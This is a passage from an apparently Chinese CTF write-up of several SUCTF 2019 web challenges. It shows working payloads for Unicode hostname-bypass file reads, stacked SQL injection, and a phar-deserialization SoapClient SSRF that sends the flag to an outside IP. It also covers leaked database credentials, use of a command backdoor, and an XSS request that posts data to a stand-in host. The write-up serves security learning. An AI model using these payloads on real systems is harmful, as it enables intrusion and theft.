class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure></p><p>看到这个代码立马想到最近blackhat大会上公布的几个trick，具体链接如下</p><p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">https://bugs.python.org/issue36742</a></p><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">https://bugs.python.org/issue36216</a></p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><p>网页源码的注释上也有提示<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Do you know the nginx? --&gt;</span></span><br></pre></td></tr></table></figure></p><p>所以我们结合上面的信息，来构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../etc/passwd</span><br></pre></td></tr></table></figure></p><p>此处用于构造c的字符来源</p><p><a href="https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols" target="_blank" rel="noopener">https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols</a></p><p>经过一番fuzz，在配置文件中读到flag的路径和名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location /flag &#123;</span><br><span class="line">    #     alias /usr/fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终读到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../usr/fffffflag</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/05/M3W1296Pk87cBxh.png" alt="12C801C2-3D42-43C5-8A68-7F8A2613DDD8.png"></p><p>如果你的字典不够给力，fuzz不到的话，不妨试试这个</p><p><a href="https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt" target="_blank" rel="noopener">https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt</a></p><h2 id="0x04-easy-sql"><a href="#0x04-easy-sql" class="headerlink" title="0x04 easy_sql"></a>0x04 easy_sql</h2><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9061" target="_blank" rel="noopener">http://47.111.59.243:9061</a></p><h4 id="题目解答-3"><a href="#题目解答-3" class="headerlink" title="题目解答"></a>题目解答</h4><p>显示随便测了一下，发现一般会有以下四种返回结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. query=1e100</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">2.query=0x730065006c0065006300740020004000400076006500%20%2e%2e%2e</span><br><span class="line"></span><br><span class="line">Too long.</span><br><span class="line"></span><br><span class="line">3.query=1)%20or%20benchmark(10000000,MD5(1))#</span><br><span class="line"></span><br><span class="line">Nonono.</span><br><span class="line"></span><br><span class="line">4.query=NULL</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>可以看到字符长度是有限制的，而且过滤了一些关键词</p><p>之后fuzz测试的过程中发现是堆叠注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 显示数据库</span><br><span class="line">query=1; show databases;</span><br><span class="line"># 回显</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; information_schema</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; CTF</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; mysql</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; performance_schema</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; score_mbamission</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; score_minnesotaunited</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 回显表名</span><br><span class="line">query=1; show tables;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Flag</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 但是过滤了from</span><br><span class="line">query=1; select * from Flag;</span><br><span class="line"># 回显</span><br><span class="line">Nonono.</span><br><span class="line"># 这样也不行</span><br><span class="line">query=1; SET @SQL=0x73656c656374202a2066726f6d20466c61673b;PREPARE pord</span><br></pre></td></tr></table></figure><p>所以最后解决方法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 直接输出flag</span><br><span class="line">query=*,1</span><br><span class="line"># 回显</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br><span class="line">    [1] =&gt; 1</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>别问，问就是fuzz</p><p><a href="https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt" target="_blank" rel="noopener">https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt</a></p><h2 id="0x05-Upload-labs-2"><a href="#0x05-Upload-labs-2" class="headerlink" title="0x05 Upload labs 2"></a>0x05 Upload labs 2</h2><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>去看看你自己到底传了个啥 <a href="http://47.111.59.243:9025/" target="_blank" rel="noopener">http://47.111.59.243:9025/</a> 交flag时去掉引号</p><h4 id="题目解答-4"><a href="#题目解答-4" class="headerlink" title="题目解答"></a>题目解答</h4><p>题目有附件，所以是一个代码审计题目，先看最终怎么可以getflag，发现有对应的函数，在<code>admin.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getFlag(<span class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">    <span class="comment">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且还限制了必须是本地来访问这个<code>admin.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br></pre></td></tr></table></figure><p>所以目标很明确，就是要ssrf的点来触发这个，从而把flag发给我</p><p>但是很尴尬的是在<code>func.php</code>中的正则，过滤掉了<code>phar</code>这个关键字，所以初看，感觉点没有办法触发，但是后面经过分析正则的话，发现使用如下方式可以bypass掉这个正则过滤，进而触发phar反序列化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://poc.phar</span><br></pre></td></tr></table></figure><p>之所以想到这个phar文件，是因为这是一个上传题，而且存在一个疑似phar反序列化的触发点–<code>func.php</code>中的这几行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">$file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">$file-&gt;getMIME();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure><p>具体来说就是<code>getMIME()</code>函数中的<code>finfo_open</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是网站并没有公开说明这个函数可以触发phar反序列化，我是怎么知道的呢？</p><p>zsx师傅曾在他的文章<a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">《Phar与Stream Wrapper造成PHP RCE的深入挖掘》</a>写到，只要函数在底层调用了这个<code>php_stream_locate_url_wrapper</code>函数，那么就能触发phar反序列化，而<code>finfo_open</code>函数在底层恰好就是使用了这个函数。（其实这个点本地盲打也能触发，所以发现的话也不难）</p><p>ext/fileinfo/fileinfo.c:517<br><img src="https://i.loli.net/2019/09/05/NWG7hzBS68DRYrK.png" alt="7F3C92B8-95A2-47A7-8C89-EAEE4EB9B696.png"></p><p>到此为止反序列化已经完整了，那么怎么进行ssrf呢？很容易联想到之前<code>wupco</code>出的easyphp中的<code>SoapClient</code>，所以就可以构造如下payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;file_name = array(null, array('location' =&gt; "http://127.0.0.1/admin.php", 'uri' =&gt; "123", 'user_agent' =&gt; "heihei\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=47.90.204.28&amp;port=2333&amp;admin=123&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"));</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = <span class="keyword">array</span>(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1/admin.php"</span>, <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>, <span class="string">'user_agent'</span> =&gt; <span class="string">"heihei\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=47.90.204.28&amp;port=2333&amp;admin=123&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$filename = <span class="string">'poc.phar'</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改后缀为<code>gif</code>之后上传得到上传路径来触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://upload/8256248f8bb97051ddea1f7946057e08/2d32ae0bbeb53285459d07235d464102.gif</span><br></pre></td></tr></table></figure><p>直接得到flag<br><img src="https://i.loli.net/2019/09/05/qJ12CDBzcX4fiK8.png" alt="AEA5041C-692A-4DB0-98F3-FE334A07A196.png"></p><h2 id="0x06-Cocktail’s-Remix"><a href="#0x06-Cocktail’s-Remix" class="headerlink" title="0x06 Cocktail’s Remix"></a>0x06 Cocktail’s Remix</h2><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9016/" target="_blank" rel="noopener">http://47.111.59.243:9016/</a></p><h4 id="题目解答-5"><a href="#题目解答-5" class="headerlink" title="题目解答"></a>题目解答</h4><p>访问 <a href="http://47.111.59.243:9016/" target="_blank" rel="noopener">http://47.111.59.243:9016/</a></p><p>发现回显的是 It Works!</p><p>所以尝试爆破路径</p><p>结果发现 <a href="http://47.111.59.243:9016/robots.txt" target="_blank" rel="noopener">http://47.111.59.243:9016/robots.txt</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /info.php</span><br><span class="line">Disallow: /download.php</span><br><span class="line">Disallow: /config.php</span><br></pre></td></tr></table></figure><p>存在任意文件下载漏洞 <a href="http://47.111.59.243:9016/download.php" target="_blank" rel="noopener">http://47.111.59.243:9016/download.php</a></p><p>参数是fuzz出来的<code>filename</code>（字典链接同上）</p><p><img src="https://i.loli.net/2019/09/05/i7X39aKvsDqZryg.png" alt="BA49C246-7822-4530-BEB6-8F3E7107851E.png"></p><p>继续使用上述字典进行fuzz，筛选出有价值的信息如下</p><p>从<code>/etc/hosts</code>发现是存在内网的mysql服务器的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.77.120.11   MysqlServer</span><br><span class="line">172.77.120.10   f8a7f2ca8591</span><br></pre></td></tr></table></figure></p><p>继续读源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># download.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment;filename="</span>.$filename);</span><br><span class="line">header(<span class="string">'Content-Length: '</span>.filesize($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看到读出了MySQL的账号密码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$db_server = "MysqlServer";</span></span><br><span class="line"><span class="comment">//$db_username = "dba";</span></span><br><span class="line">    <span class="comment">//$db_password = "rNhHmmNkN3xu4MBYhm";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>还有一个phpinfo页面<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># info.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在页面上没有发现常规漏洞，但是发现了一个与题目名称类似的扩展模块</p><p><img src="https://i.loli.net/2019/09/05/ApqTzZoxN7RFiPG.png" alt="26702F33-A0B9-46C5-B715-2809924CD850.png"></p><p>所以尝试进行下载 <code>/usr/lib/apache2/modules/mod_cocktail.so</code></p><p>先用file命令看了一下，发现是64位程序，所以使用IDA Pro直接来进行分析</p><p><img src="https://i.loli.net/2019/09/05/JMl7xh3vN9VO8dg.png" alt="52722269-5528-4210-AAD5-B278614FD402.png"></p><p>直接定位到关键函数，可以看到其中使用了<code>popen</code>函数来执行经过<code>j_remix</code>函数处理的<code>reffer</code>变量，所以基本可以判定此处是存在一个命令执行的后门。<br><img src="https://i.loli.net/2019/09/05/5aALED7ZmKgzOFW.png" alt="C4D0A50A-E002-4320-8503-2C3570E9A3DB.png"></p><p><code>j_remix</code>函数是调用了<code>remix</code>函数，看起来比较复杂，但应该是某种编码方式</p><p><img src="https://i.loli.net/2019/09/05/pNoUHemk8gz65IC.png" alt="2401F6EC-FAAD-4AD3-A254-B1A7B5411AC5.png"></p><p>此处使用IDA的findcrypt插件，直接发现了base64表，所以猜测是base64编码</p><p><img src="https://i.loli.net/2019/09/05/c4YKaMtJT2G51Hx.png" alt="BE1138CB-7F30-4541-B3AB-8E9B5B828077.png"></p><p>那么接下来可以测一下这个后门，可以看到成功回显</p><p><img src="https://i.loli.net/2019/09/05/uanreZOVpRiPd1f.png" alt="F22B1242-EFDD-483F-AB02-18C262DF8CEF.png"></p><p>可以看到没有权限写webshell</p><p><img src="https://i.loli.net/2019/09/05/WKvYDS6LZsNoEVJ.png" alt="FF485A77-74E1-4E41-82CA-086B1F045092.png"></p><p>所以可能稍微麻烦一点，我们得用之前得到的mysql账号密码来查看数据库的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;show databases;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/fKdHt4SpQmzAnle.png" alt="68872B88-735E-49F6-A900-A12F57569938.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;show tables;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/Kr4mvRwXLbkIBeg.png" alt="A70813D1-5BD6-4CC7-A1F7-7A98FA6341B2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;select * from flag;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/S7BDRxJkFsZygEf.png" alt="2A034AD6-0DFB-4FBD-A607-D299ACD5DFF1.png"></p><h2 id="0x07-iCloudMusic"><a href="#0x07-iCloudMusic" class="headerlink" title="0x07 iCloudMusic"></a>0x07 iCloudMusic</h2><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>题目做累了就来听听歌放放松吧。比如黑客专属歌单id： 2810583532 ps: api可能会被网易封ip导致没办法听歌，但是不影响做题</p><p>附件下载链接: <a href="https://pan.baidu.com/s/1GLfe-PP30bsIkVPvE012Hw" target="_blank" rel="noopener">https://pan.baidu.com/s/1GLfe-PP30bsIkVPvE012Hw</a> 提取码: 37gn</p><p>coding上传了一份， 大家网不好的可以到coding上面下 <a href="https://coding.net/u/ImageMLT/p/iCloudMusic/git" target="_blank" rel="noopener">https://coding.net/u/ImageMLT/p/iCloudMusic/git</a></p><h4 id="题目解答-6"><a href="#题目解答-6" class="headerlink" title="题目解答"></a>题目解答</h4><p>下载之后发现是一个Electron框架写的webapp，因此直接采用常规的Electron应用分析方式来进行分析，本文的环境是macOS，其余同理。</p><p>首先进入到如下目录找到asar结尾的文件，此处的名字是<code>app.asar</code>，这是一种类似tar的打包之后的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/zeroyu/Downloads/iCloudMusic-darwin-x64/iCloudMusic.app/Contents/Resources</span><br></pre></td></tr></table></figure></p><p>之后使用npm全局安装asar工具，来进行解包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar extract app.asar tmp</span><br></pre></td></tr></table></figure><p>之后进入解包的目录，安装相关依赖后启动app</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure><p>首先分析代码发现<code>src/index.js</code>中<code>nodeIntegration</code>是开启的，说明可以注入代码来达到rce的目的。</p><p>随后又在<code>src/main.js</code>文件中发现如下代码，这段代码说明可以执行任意代码了</p><p><img src="https://i.loli.net/2019/09/05/QLyrleC4G7fSP2d.png" alt="9C84AE9D-422B-4C9F-8D5E-3C5BDEBC23E9.png"></p><p>之后，又在<code>src/list.html</code>中发现用于分享给管理员的代码，所以起初就判断是xss</p><p><img src="https://i.loli.net/2019/09/05/kWtoO7mvAxdwuLs.png" alt="24038218-01F0-4F92-8EB6-159EB9E88871.png"></p><p>所以在分析如下接口的信息之后构造出如下poc来尝试读取一些信息(@5am3 tql)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;header&quot;:&quot;&apos;var t = new XMLHttpRequest;t.open(&apos;POST&apos;, &apos;//eval.com:port&apos;, !0),t.setRequestHeader(&apos;Content-type&apos;, &apos;text/plain&apos;),t.onreadystatechange = function() &#123;  4 == t.readyState &amp;&amp; t.status&#125;,t.send(&apos;test,hhhh&apos;);//&#125;;&quot;,&quot;title&quot;:&quot;xxxx&quot;,&quot;desc&quot;:&quot;xxx&quot;&#125;</span><br></pre></td></tr></table></figure><p>由于始终打不到flag相关字眼，所以就问了出题人，说要rce，如实转换思路开始rce之旅</p><p>再进一步调试前，首先增加一些便于调试的代码</p><ol><li>在<code>src/main.js</code>中添加如下代码</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webview = <span class="built_in">document</span>.getElementById(<span 